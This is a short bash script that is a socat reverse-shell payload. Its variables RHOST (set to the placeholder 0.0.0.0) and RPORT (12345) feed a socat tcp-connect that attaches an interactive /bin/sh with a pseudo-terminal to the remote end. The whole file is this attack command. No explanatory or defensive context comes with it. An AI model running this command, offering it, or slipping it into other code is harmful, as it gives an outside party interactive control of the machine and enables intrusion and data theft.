#!/bin/bash

RHOST=0.0.0.0
RPORT=12345
socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
